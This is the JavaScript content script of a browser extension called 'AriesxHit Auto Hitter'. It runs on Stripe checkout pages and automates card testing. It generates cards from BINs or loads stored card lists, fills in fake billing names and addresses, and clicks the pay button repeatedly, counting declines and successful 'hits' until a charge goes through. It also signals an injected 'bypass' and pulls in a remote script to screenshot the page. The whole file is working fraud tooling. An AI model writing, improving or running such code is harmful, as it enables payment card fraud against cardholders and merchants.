// ===================================
// AriesxHit Auto Hitter UI
// Only on Stripe payment pages
// ===================================

(function () {
  'use strict';
  if (window.__ARIESXHIT_UI__) return;

  function isStripePaymentPage() {
    const h = (document.location.hostname || '').toLowerCase();
    const p = (document.location.pathname || '').toLowerCase();
    const u = (document.location.href || '').toLowerCase();
    if (h.includes('stripe.com')) return true;
    if (h.includes('billing') || h.includes('checkout')) return true;
    if (/\/c\/pay\/|\/pay\/|checkout|billing/i.test(p) || /\/c\/pay\/|checkout\.stripe|api\.stripe/i.test(u)) return true;
    if (document.querySelector('script[src*="js.stripe.com"], iframe[src*="stripe.com"], iframe[src*="stripe.network"]')) return true;
    if (document.querySelector('[data-elements-stable-field-name], [data-stripe]')) return true;
    return false;
  }

  function getPageText(doc) {
    if (!doc?.body) return '';
    try { return (doc.body.innerText || doc.body.textContent || '').toLowerCase(); } catch (_) { return ''; }
  }

  function isCheckoutEnded() {
    const phrases = [
      "you're all done here",
      "you've either completed your payment",
      "checkout session has timed out",
      "session has expired",
      "this checkout is no longer active",
      "payment complete",
      "thank you for your payment"
    ];
    const check = (text) => phrases.some((p) => text.includes(p));
    if (check(getPageText(document))) return true;
    for (const f of document.querySelectorAll?.('iframe') || []) {
      try {
        const d = f.contentDocument || f.contentWindow?.document;
        if (d && check(getPageText(d))) return true;
      } catch (_) {}
    }
    return false;
  }

  function tryInit() {
    if (window.__ARIESXHIT_UI__) return false;
    if (!isStripePaymentPage()) return false;
    window.__ARIESXHIT_UI__ = true;
    return true;
  }

  window.addEventListener('message', (e) => {
    if (e.data?.ariesxhit === 'clickPay' && window.self !== window.top) {
      try { clickPayButton(); } catch (_) {}
    }
  });

  const DEFAULT_NAME = 'MIKEY FRR';
  const DEFAULT_EMAILS = ['itzmi3xel@gmail.com', 'user@example.com', 'test@gmail.com'];
  const DEFAULT_ADDRESS = '152 Forest Avenue';
  const DEFAULT_COUNTRY = 'Macao SAR China';
  const DEFAULT_COUNTRY_CODE = 'MO';

  let state = { mode: 'BIN', binList: [], cardList: [], active: false, paused: false, hitSuccess: false, fillData: {}, loggedIn: false, lastTryingAt: 0, addressKeeper: null, checkoutWatcher: null, cardsTried: 0, successCount: 0, initialCardCount: 0, userIP: '', statusBoxMinimized: false };

  function send(type, data) {
    try { chrome.runtime.sendMessage({ type, ...data }); } catch (_) {}
  }

  function doStop() {
    if (!state.active) return;
    send('STOP_AUTO_HIT');
    state.active = false;
    state.paused = false;
    if (state.addressKeeper) { state.addressKeeper(); state.addressKeeper = null; }
    if (state.checkoutWatcher) { clearInterval(state.checkoutWatcher); state.checkoutWatcher = null; }
    updateStatusUI();
  }

  function updateStatusUI() {
    const dot = document.getElementById('ax-status-dot');
    const label = document.getElementById('ax-status-label');
    const tried = document.getElementById('ax-cards-tried');
    const success = document.getElementById('ax-success-count');
    const playBtn = document.getElementById('ax-ctrl-play');
    if (dot) {
      dot.classList.toggle('paused', !state.hitSuccess && (!state.active || state.paused));
      dot.classList.toggle('active', state.active && !state.paused);
      dot.classList.toggle('success', state.hitSuccess);
    }
    if (label) label.textContent = state.hitSuccess ? 'Success!' : (state.paused ? 'Paused' : (state.active ? 'Active' : 'Paused'));
    if (tried) tried.textContent = state.cardsTried;
    if (success) success.textContent = state.successCount;
    if (playBtn) {
      const icon = playBtn.querySelector('.ax-icon-play');
      if (state.active && !state.paused) { playBtn.title = 'Pause'; if (icon) icon.textContent = '❚❚'; }
      else if (state.active && state.paused) { playBtn.title = 'Resume'; if (icon) icon.textContent = '▶'; }
      else { playBtn.title = 'Start'; if (icon) icon.textContent = '▶'; }
    }
  }

  function showInfoToastStyled(message, className = 'ax-toast-info-styled') {
    const wrap = document.getElementById('ariesxhit-toasts');
    if (!wrap) return;
    const now = new Date();
    const timeStr = now.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true });
    const dateStr = (now.getMonth() + 1) + '/' + now.getDate() + '/' + now.getFullYear();
    const box = document.createElement('div');
    box.className = className;
    box.style.animation = 'ax-toast-premium-in 0.45s cubic-bezier(0.34, 1.56, 0.64, 1) forwards';
    box.innerHTML = `
      <div class="ax-toast-styled-header">
        <span class="ax-toast-styled-icon">i</span>
        <span class="ax-toast-styled-type">INFO</span>
        <button class="ax-toast-styled-close">×</button>
      </div>
      <div class="ax-toast-styled-body">
        <div class="ax-toast-styled-msg">${String(message).replace(/</g, '&lt;')}</div>
        <div class="ax-toast-styled-time">${timeStr} ${dateStr}</div>
      </div>
    `;
    box.querySelector('.ax-toast-styled-close').onclick = () => box.remove();
    wrap.insertBefore(box, wrap.firstChild);
    while (wrap.children.length > 8) wrap.removeChild(wrap.lastChild);
    setTimeout(() => { if (box.parentNode) box.remove(); }, 4000);
  }

  function createUI() {
    // Remove existing UI to prevent duplicates
    const existingUI = document.getElementById('ariesxhit-ui');
    if (existingUI) {
      existingUI.remove();
    }

    const wrap = document.createElement('div');
    wrap.id = 'ariesxhit-ui';

    wrap.innerHTML = `
      <div id="ariesxhit-checkout-banner" class="ax-checkout-banner">2D Checkout Detected ✓</div>
      <div id="ariesxhit-status-box" class="ax-status-box">
        <div class="ax-status-minibar" id="ax-status-minibar">
          <span class="ax-minibar-brand">AriesxHit</span>
          <button class="ax-minibar-expand" id="ax-status-expand" title="Expand">+</button>
          <span class="ax-minibar-version">V2</span>
        </div>
        <div class="ax-status-content" id="ax-status-content">
          <div class="ax-status-header">
            <span class="ax-status-title"><span class="ax-title-cyan">Aries</span><span class="ax-title-white">xHit</span></span>
            <div class="ax-status-header-btns">
              <button class="ax-status-minimize-btn" id="ax-status-minimize-btn" title="Minimize">−</button>
              <span class="ax-status-version">V2</span>
            </div>
          </div>
          <div class="ax-status-indicator">
            <span class="ax-status-dot paused" id="ax-status-dot"></span>
            <span class="ax-status-label" id="ax-status-label">Paused</span>
          </div>
          <div class="ax-status-stats">
            <div class="ax-stat-card"><span class="ax-stat-label">Cards Tried</span><span class="ax-stat-value red" id="ax-cards-tried">0</span></div>
            <div class="ax-stat-card"><span class="ax-stat-label">Success</span><span class="ax-stat-value green" id="ax-success-count">0</span></div>
          </div>
          <div class="ax-status-ip">
            <span class="ax-ip-label">IP:</span>
            <span class="ax-ip-value" id="ax-ip-value" title="Hover to reveal">••••••••</span>
          </div>
        </div>
      </div>
      <div class="ax-control-buttons">
        <button class="ax-ctrl-btn ax-ctrl-stop" id="ax-ctrl-stop" title="Stop"><span class="ax-icon-stop">■</span></button>
        <button class="ax-ctrl-btn ax-ctrl-play" id="ax-ctrl-play" title="Start"><span class="ax-icon-play">▶</span></button>
        <button class="ax-ctrl-btn ax-ctrl-mode" id="ax-ctrl-mode" title="BIN / CC Mode"><span class="ax-icon-cc">💳</span></button>
      </div>
      <div id="ariesxhit-toasts"></div>
    `;

    const link = document.createElement('link');
    link.rel = 'stylesheet';
    link.href = chrome.runtime.getURL('assets/styles/autohitter.css');
    document.head.appendChild(link);
    document.body.appendChild(wrap);
    return wrap;
  }

  function setMode(mode) {
    state.mode = mode;
    chrome.storage.local.set({ ax_mode: mode });
    if (mode === 'BIN') showInfoToastStyled('Switched to BIN Generation mode');
    else showInfoToastStyled('Switched to CC List mode');
  }

  function setup() {
    chrome.storage.local.get(['ax_mode'], (r) => { if (r.ax_mode === 'CC') state.mode = 'CC'; });

    const toggleMinimize = () => {
      state.statusBoxMinimized = !state.statusBoxMinimized;
      document.getElementById('ariesxhit-status-box')?.classList.toggle('minimized', state.statusBoxMinimized);
    };
    document.getElementById('ax-status-expand').onclick = toggleMinimize;
    document.getElementById('ax-status-minimize-btn').onclick = toggleMinimize;
    document.getElementById('ax-ctrl-stop').onclick = () => {
      if (state.active) {
        if (state.mode === 'CC' && state.cardsTried >= state.initialCardCount && state.initialCardCount > 0) showInfoToastStyled('Card List Ended', 'ax-toast-ended');
        doStop();
      }
    };
    // Use event delegation on the control buttons container
    const controlButtons = document.querySelector('.ax-control-buttons');
    if (controlButtons) {
      controlButtons.addEventListener('click', (e) => {
        e.stopPropagation();

        const target = e.target.closest('.ax-ctrl-btn');
        if (!target) return;

        const buttonId = target.id;
        console.log('Control button clicked:', buttonId, 'target element:', e.target.tagName, 'closest button:', target.tagName);

        if (buttonId === 'ax-ctrl-play') {
          console.log('PLAY BUTTON functionality triggered');
          if (state.paused && state.active) {
            state.paused = false;
            updateStatusUI();
            [0, 300, 600].forEach((ms) => setTimeout(() => {
              if (state.active && !state.paused) clickPayButton();
            }, ms));
            return;
          }
          if (state.active) {
            state.paused = true;
            updateStatusUI();
            return;
          }
          handleStart();
        } else if (buttonId === 'ax-ctrl-mode') {
          console.log('MODE BUTTON functionality triggered');
          const next = state.mode === 'BIN' ? 'CC' : 'BIN';
          setMode(next);
        } else if (buttonId === 'ax-ctrl-stop') {
          console.log('STOP BUTTON functionality triggered');
          doStop();
        }
      });
    } else {
      console.error('Control buttons container not found!');
    }
    const ipEl = document.getElementById('ax-ip-value');
    chrome.runtime.sendMessage({ type: 'GET_IP' }, (r) => { state.userIP = r?.ip || ''; if (ipEl) ipEl.textContent = state.userIP || '—'; });
  }

  function handleStart() {
    if (state.active) { doStop(); return; }
    chrome.storage.local.get([
      'savedBins', 'savedCards', 'ax_fill_name', 'ax_fill_email',
      'ax_random_names', 'ax_random_addr', 'ax_fill_street1', 'ax_fill_street2', 'ax_fill_locality',
      'ax_fill_card_mask', 'ax_fill_expiry_mask', 'ax_fill_cvv_mask'
    ], (st) => {
      const useRandomNames = st.ax_random_names !== false;
      const useRandomAddr = st.ax_random_addr !== false;
      const name = useRandomNames ? DEFAULT_NAME : ((st.ax_fill_name || '').trim() || DEFAULT_NAME);
      const email = (st.ax_fill_email || '').trim() || DEFAULT_EMAILS[Math.floor(Math.random() * DEFAULT_EMAILS.length)];
      const street1 = (st.ax_fill_street1 || '').trim() || DEFAULT_ADDRESS;
      const street2 = (st.ax_fill_street2 || '').trim();
      const locality = (st.ax_fill_locality || '').trim();
      const address = useRandomAddr ? DEFAULT_ADDRESS : (street2 ? `${street1}, ${street2}` : street1);
      state.fillData = {
        name,
        email,
        address,
        city: locality,
        country: DEFAULT_COUNTRY,
        countryCode: DEFAULT_COUNTRY_CODE,
      };
      const expMask = (st.ax_fill_expiry_mask || '09/29').trim();
      const [mm, yy] = expMask.includes('/') ? expMask.split('/') : [expMask.slice(0, 2), expMask.slice(-2)];
      state.maskData = {
        number: (st.ax_fill_card_mask || '').replace(/\D/g, '').padEnd(16, '0').slice(0, 16) || '0000000000000000',
        month: (mm || '01').padStart(2, '0'),
        year: (yy || '29').padStart(2, '0'),
        cvv: (st.ax_fill_cvv_mask || '000').replace(/\D/g, '').slice(0, 4) || '000',
      };

      if (state.mode === 'CC') {
        const raw = (st.savedCards || '').trim();
        const lines = raw ? raw.split(/\r?\n/).filter((l) => l.trim()) : [];
        const cards = [];
        for (const line of lines) {
          const parts = line.trim().split('|');
          const num = (parts[0] || '').replace(/\D/g, '');
          const month = (parts[1] || '12').padStart(2, '0');
          const year = (parts[2] || '28').toString().slice(-2);
          let cvv = (parts[3] || '123').replace(/\D/g, '');
          const amex = num.startsWith('34') || num.startsWith('37');
          if (amex && cvv.length === 3) cvv = cvv.padStart(4, '0');
          if (num.length >= 13) cards.push(`${num}|${month}|${year}|${cvv}`);
        }
        if (!cards.length) { showInfoToastStyled('Configure CC list in dashboard first'); return; }
        chrome.runtime.sendMessage({ type: 'START_AUTO_HIT', data: { cards } }, (r) => {
          if (r?.ok) {
            state.cardList = r.cardList || []; state.active = true; state.initialCardCount = cards.length; state.cardsTried = 0; state.successCount = 0; state.hitSuccess = false;
            if (state.checkoutWatcher) clearInterval(state.checkoutWatcher);
            state.checkoutWatcher = setInterval(() => {
              if (state.active && (!isStripePaymentPage() || isCheckoutEnded())) doStop();
            }, 2000);
            updateStatusUI(); runAutoFill();
          }
        });
      } else {
        const bins = Array.isArray(st.savedBins) ? st.savedBins : [];
        if (!bins.length) { showInfoToastStyled('Configure BIN in dashboard first'); return; }
        chrome.runtime.sendMessage({ type: 'START_AUTO_HIT', data: { bins } }, (r) => {
          if (r?.ok) {
            state.cardList = r.cardList || []; state.active = true; state.initialCardCount = 0; state.cardsTried = 0; state.successCount = 0; state.hitSuccess = false;
            if (state.checkoutWatcher) clearInterval(state.checkoutWatcher);
            state.checkoutWatcher = setInterval(() => {
              if (state.active && (!isStripePaymentPage() || isCheckoutEnded())) doStop();
            }, 2000);
            updateStatusUI(); runAutoFill();
          }
        });
      }
    });
  }

  function findPayButton(doc) {
    if (!doc) return null;
    const icon = doc.querySelector('.SubmitButton-IconContainer');
    if (icon) {
      const btn = icon.closest('button') || icon.closest('[role="button"]') || icon.closest('[class*="SubmitButton"]') || icon.parentElement;
      return btn || icon;
    }
    return doc.querySelector('button[class*="SubmitButton"]') || doc.querySelector('[class*="SubmitButton"]');
  }

  function doClickPay(el) {
    if (!el) return false;
    try {
      const rect = el.getBoundingClientRect?.();
      if (!rect || rect.width <= 0 || rect.height <= 0) return false;
      if (el.disabled) el.removeAttribute('disabled');
      const x = rect.left + rect.width / 2;
      const y = rect.top + rect.height / 2;
      const opts = { bubbles: true, cancelable: true, view: window, clientX: x, clientY: y };
      ['mousedown', 'mouseup', 'click'].forEach((type) => {
        el.dispatchEvent(new MouseEvent(type, opts));
      });
      el.click?.();
      return true;
    } catch (_) { return false; }
  }

  function clickPayButton() {
    const tryFrame = (doc) => {
      if (!doc) return null;
      const btn = findPayButton(doc);
      if (btn && doClickPay(btn)) return true;
      for (const f of doc.querySelectorAll?.('iframe') || []) {
        try {
          const d = f.contentDocument || f.contentWindow?.document;
          if (d && tryFrame(d)) return true;
          f.contentWindow?.postMessage?.({ ariesxhit: 'clickPay' }, '*');
        } catch (_) {}
      }
      return false;
    };
    if (tryFrame(document)) return;
    for (const b of document.querySelectorAll('button, [role="button"]')) {
      if ((b.textContent || '').trim().toLowerCase() === 'pay') { doClickPay(b); return; }
    }
  }

  function runAutoFill(doClick) {
    if (!state.active) return;
    const sel = (s) => document.querySelector(s);
    const fill = (el, v) => {
      if (!el || v == null) return;
      try { el.value = String(v); el.dispatchEvent(new Event('input', { bubbles: true })); el.dispatchEvent(new Event('change', { bubbles: true })); } catch (_) {}
    };
    fill(sel('input[type="email"]') || sel('input[name*="email" i]'), state.fillData?.email);
    fill(sel('input[name*="name" i]') || sel('input[placeholder*="name" i]') || sel('input[autocomplete="cc-name"]'), state.fillData?.name);
    const customAddress = state.fillData?.address && state.fillData?.country;
    let billingData = customAddress ? {
      address: state.fillData.address,
      country: state.fillData.country,
      countryCode: state.fillData.countryCode || 'MO',
      addressOnly: true
    } : (typeof window.getAutoAddress === 'function' ? window.getAutoAddress() : {
      address: DEFAULT_ADDRESS,
      country: DEFAULT_COUNTRY,
      countryCode: DEFAULT_COUNTRY_CODE,
      addressOnly: true
    });
    try { window.__ax_billing = { country: billingData.countryCode || 'MO', line1: billingData.address, city: billingData.city || '', state: '', postal_code: '' }; } catch (_) {}
    document.querySelectorAll('select').forEach((sel) => {
      const opts = [...sel.options];
      const mo = opts.find((o) => /^mo$/i.test(String(o.value || '').trim()));
      if (mo) try { sel.value = mo.value; sel.dispatchEvent(new Event('change', { bubbles: true })); } catch (_) {}
    });
    document.querySelectorAll('input').forEach((inp) => {
      const p = (inp.placeholder || '').toLowerCase();
      if ((p === 'address' || p.includes('address')) && !p.includes('line 2') && billingData?.address) {
        try { inp.value = billingData.address; inp.dispatchEvent(new Event('input', { bubbles: true })); inp.dispatchEvent(new Event('change', { bubbles: true })); } catch (_) {}
      }
    });
    const mask = state.maskData || { number: '0000000000000000', month: '01', year: '30', cvv: '000' };
    if (typeof window.autoFillCard === 'function') window.autoFillCard(mask, false);
    if (typeof window.autoFillBillingStepByStep === 'function') {
      window.autoFillBillingStepByStep(billingData, () => {
        if (state.addressKeeper) state.addressKeeper();
        if (typeof window.lockAddressKeeper === 'function') state.addressKeeper = window.lockAddressKeeper(billingData, 800);
        if (doClick !== false) {
          [0, 400, 800, 1200, 1800, 2500, 3500].forEach((ms) => setTimeout(() => { if (state.active && !state.paused) clickPayButton(); }, ms));
        }
      });
    } else if (typeof window.autoFillBilling === 'function') {
      window.autoFillBilling({ ...billingData, addressOnly: true });
      if (state.addressKeeper) state.addressKeeper();
      if (typeof window.lockAddressKeeper === 'function') state.addressKeeper = window.lockAddressKeeper(billingData, 800);
      if (doClick !== false) {
        [0, 400, 800, 1200, 1800, 2500, 3500].forEach((ms) => setTimeout(() => { if (state.active && !state.paused) clickPayButton(); }, ms));
      }
    }
  }

  const toastQueue = [];
  let toastShowing = null;

  function appendLog(type, data) {
    toastQueue.push({ type, data });
    processToastQueue();
  }

  function processToastQueue() {
    if (toastShowing || !toastQueue.length) return;
    const { type, data } = toastQueue.shift();
    toastShowing = true;
    showPageToast(type, data, () => {
      toastShowing = null;
      if (toastQueue.length) setTimeout(processToastQueue, 300);
    });
  }

  const DECLINE_DESCRIPTIONS = {
    generic_decline: 'The card was declined for an unknown reason.',
    insufficient_funds: 'The card has insufficient funds.',
    lost_card: 'The card has been reported lost.',
    stolen_card: 'The card has been reported stolen.',
    expired_card: 'The card has expired.',
    incorrect_cvc: 'The CVC is incorrect.',
    processing_error: 'An error occurred while processing the card.',
    do_not_honor: 'The card was declined. Do not honor.',
    restricted_card: 'The card has restrictions.',
    try_again_later: 'Please try again later.',
  };

  function showPageToast(type, data, onDismiss) {
    const esc = (s) => String(s || '').replace(/</g, '&lt;').replace(/>/g, '&gt;');
    const wrap = document.getElementById('ariesxhit-toasts');
    if (!wrap) return;
    const box = document.createElement('div');
    box.style.animation = 'ax-toast-premium-in 0.45s cubic-bezier(0.34, 1.56, 0.64, 1) forwards';
    const cardStr = data.card || '';
    const copyBtn = cardStr ? `<button type="button" class="ax-toast-copy" title="Copy CC">📋</button>` : '';
    if (type === 'error') {
      box.className = 'ax-toast-error';
      const decline_code = data.decline_code || data.code || 'unknown';
      const desc = DECLINE_DESCRIPTIONS[decline_code] || 'The card was declined.';
      box.innerHTML = `
        <div class="ax-toast-error-header">
          <span class="ax-toast-error-icon">×</span>
          <span class="ax-toast-error-type">ERROR</span>
          <button class="ax-toast-error-close">×</button>
        </div>
        <div class="ax-toast-error-body">
          <div class="ax-toast-error-title">Payment Declined</div>
          <div class="ax-toast-error-code"><span class="label">Error Code:</span><span class="value">${esc(decline_code)}</span></div>
          <div class="ax-toast-error-desc">This error typically means: ${desc}</div>
        </div>
      `;
    } else if (type === 'trying') {
      box.className = 'ax-toast-trying';
      box.innerHTML = `
        <div class="ax-toast-trying-header">
          <span class="ax-toast-trying-icon">i</span>
          <span class="ax-toast-trying-type">INFO</span>
          <button class="ax-toast-trying-close">×</button>
        </div>
        <div class="ax-toast-trying-body">
          <div class="ax-toast-trying-label">Trying Card:</div>
          <div class="ax-toast-trying-cardbox">${esc(cardStr)} ${copyBtn}</div>
          <span class="ax-toast-trying-attempt">Attempt: ${data.attempt || 1}</span>
        </div>
      `;
    } else if (type === 'hit') {
      const attempt = data.attempt ?? 1;
      const timeTaken = state.lastTryingAt ? Math.max(1, Math.round((Date.now() - state.lastTryingAt) / 1000)) : 0;
      const now = new Date();
      const timeStr = now.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true });
      const dateStr = (now.getMonth() + 1) + '/' + now.getDate() + '/' + now.getFullYear();
      box.className = 'ax-toast-success';
      box.innerHTML = `
        <div class="ax-success-dots"></div>
        <div class="ax-success-header">
          <span class="ax-success-header-icon">✓</span>
          <span class="ax-success-header-type">SUCCESS</span>
          <button class="ax-success-close">×</button>
        </div>
        <div class="ax-success-body">
          <span class="ax-success-icon-large">✓</span>
          <span class="ax-success-title">Payment Processed Successfully</span>
        </div>
        <div class="ax-success-footer">
          <span class="ax-success-time">${timeStr} ${dateStr}</span>
          ${cardStr ? `<button type="button" class="ax-toast-copy" title="Copy CC">📋</button>` : ''}
        </div>
      `;
    } else return;
    const removeAndNext = () => { if (box.parentNode) box.remove(); onDismiss?.(); };
    box.querySelector('.ax-toast-error-close, .ax-toast-trying-close, .ax-success-close')?.addEventListener?.('click', removeAndNext);
    wrap.innerHTML = '';
    wrap.appendChild(box);
    box.querySelectorAll('.ax-toast-copy, .ax-copy-btn').forEach((btn) => {
      btn.onclick = (e) => { e.stopPropagation(); navigator.clipboard?.writeText(cardStr).then(() => showInfoToastStyled('Copied!')).catch(() => {}); };
    });
    const delay = type === 'trying' ? 1500 : type === 'error' ? 1500 : type === 'hit' ? 20000 : 3000;
    setTimeout(removeAndNext, delay);
  }

  chrome.runtime.onMessage.addListener((msg) => {
    if (msg.type === 'STATE_UPDATE') {
      state.active = msg.autoHitActive ?? state.active;
      if (!state.active) {
        if (state.addressKeeper) { state.addressKeeper(); state.addressKeeper = null; }
        if (state.checkoutWatcher) { clearInterval(state.checkoutWatcher); state.checkoutWatcher = null; }
      }
      state.cardList = msg.cardList ?? state.cardList;
      state.binList = msg.binList ?? state.binList;
      if (msg.attempts != null) state.cardsTried = msg.attempts;
      if (msg.hits != null) state.successCount = msg.hits;
      updateStatusUI();
    }
    if (msg.type === 'STATS_UPDATE') {
      if (msg.attempts != null) state.cardsTried = msg.attempts;
      if (msg.hits != null) state.successCount = msg.hits;
      updateStatusUI();
    }
    if (msg.type === 'CARD_TRYING') { state.lastTryingAt = Date.now(); state.cardsTried = msg.attempt || state.cardsTried; updateStatusUI(); appendLog('trying', msg); }
    if (msg.type === 'CARD_ERROR') {
      appendLog('error', msg);
      if (state.active && !state.paused) [1200, 2500, 4000, 6000].forEach((ms) => setTimeout(() => { if (state.active && !state.paused) clickPayButton(); }, ms));
    }
    if (msg.type === 'CARD_HIT') {
      state.successCount++;
      state.hitSuccess = true;
      updateStatusUI();
      appendLog('hit', msg);
      if (state.active) doStop();
      playSuccessSound();
    }
  });

  function init() {
    createUI();
    setup();

    send('RESET_STATS_NEW_CHECKOUT');
    state.cardsTried = 0;
    state.successCount = 0;
    state.hitSuccess = false;
    updateStatusUI();

    chrome.runtime.sendMessage({ type: 'GET_STATE' }, (r) => {
      if (r) {
        state.active = r.autoHitActive ?? false;
        state.cardList = r.cardList ?? [];
        state.binList = r.binList ?? [];
        updateStatusUI();
      }
    });

    send('INJECT_BYPASS');
    const banner = document.getElementById('ariesxhit-checkout-banner');
    if (banner) { banner.classList.add('visible'); setTimeout(() => banner.classList.remove('visible'), 4000); }
    startBackgroundMusicIfEnabled();
  }

  let bgMusicAudio = null;
  function startBackgroundMusicIfEnabled() {
    chrome.storage.local.get(['ax_background_music', 'ax_custom_music_data'], (s) => {
      if (s.ax_background_music !== true) return;
      if (bgMusicAudio) { bgMusicAudio.pause(); bgMusicAudio = null; }
      const src = s.ax_custom_music_data || chrome.runtime.getURL('assets/sounds/default-bg.mp3');
      bgMusicAudio = new Audio(src);
      bgMusicAudio.loop = true;
      bgMusicAudio.volume = 0.5;
      bgMusicAudio.play().catch(() => {});
    });
  }
  function stopBackgroundMusic() {
    if (bgMusicAudio) { bgMusicAudio.pause(); bgMusicAudio = null; }
  }
  chrome.storage.onChanged.addListener((changes, area) => {
    if (area !== 'local') return;
    const bg = changes.ax_background_music?.newValue;
    if (bg === true) startBackgroundMusicIfEnabled();
    else if (bg === false) stopBackgroundMusic();
  });

  function playSuccessSound() {
    try {
      const url = chrome.runtime.getURL('assets/sounds/hit.wav');
      const audio = new Audio(url);
      audio.volume = 0.05;
      audio.addEventListener('canplaythrough', function applyVol() {
        audio.volume = 0.05;
        audio.removeEventListener('canplaythrough', applyVol);
      }, { once: true });
      audio.play().catch(() => {});
    } catch (_) {}
  }

  function tryCaptureWithHtml2Canvas() {
    const script = document.createElement('script');
    script.textContent = `
      (function() {
        var s = document.createElement('script');
        s.src = 'https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js';
        s.onload = function() {
          try {
            html2canvas(document.documentElement, { useCORS: true, allowTaint: true, logging: false, scale: 1 }).then(function(c) {
              var d = c.toDataURL('image/png');
              window.postMessage({ __ax_screenshot: true, data: d }, '*');
            }).catch(function() { window.postMessage({ __ax_screenshot: false }, '*'); });
          } catch(e) { window.postMessage({ __ax_screenshot: false }, '*'); }
        };
        s.onerror = function() { window.postMessage({ __ax_screenshot: false }, '*'); };
        (document.head||document.documentElement).appendChild(s);
      })();
    `;
    (document.head || document.documentElement).appendChild(script);
    script.remove();
  }

  window.addEventListener('message', function(e) {
    if (e.source !== window || !e.data || e.data.__ax_screenshot === undefined) return;
    if (e.data.__ax_screenshot && e.data.data) {
      send('SCREENSHOT_DATA', { dataUrl: e.data.data });
    }
  });

  function boot() {
    if (window.self !== window.top) {
      if (tryInit()) { /* iframe: ready for clickPay via postMessage */ }
      return;
    }
    if (tryInit()) {
      if (document.body) init();
      else document.addEventListener('DOMContentLoaded', init);
      return;
    }
    const doInit = () => { if (tryInit()) init(); };
    setTimeout(doInit, 1200);
    const obs = new MutationObserver(doInit);
    if (document.body) obs.observe(document.body, { childList: true, subtree: true });
    else document.addEventListener('DOMContentLoaded', () => obs.observe(document.body, { childList: true, subtree: true }));
    setTimeout(() => obs.disconnect(), 12000);
  }
  if (document.body) boot();
  else document.addEventListener('DOMContentLoaded', boot);
})();
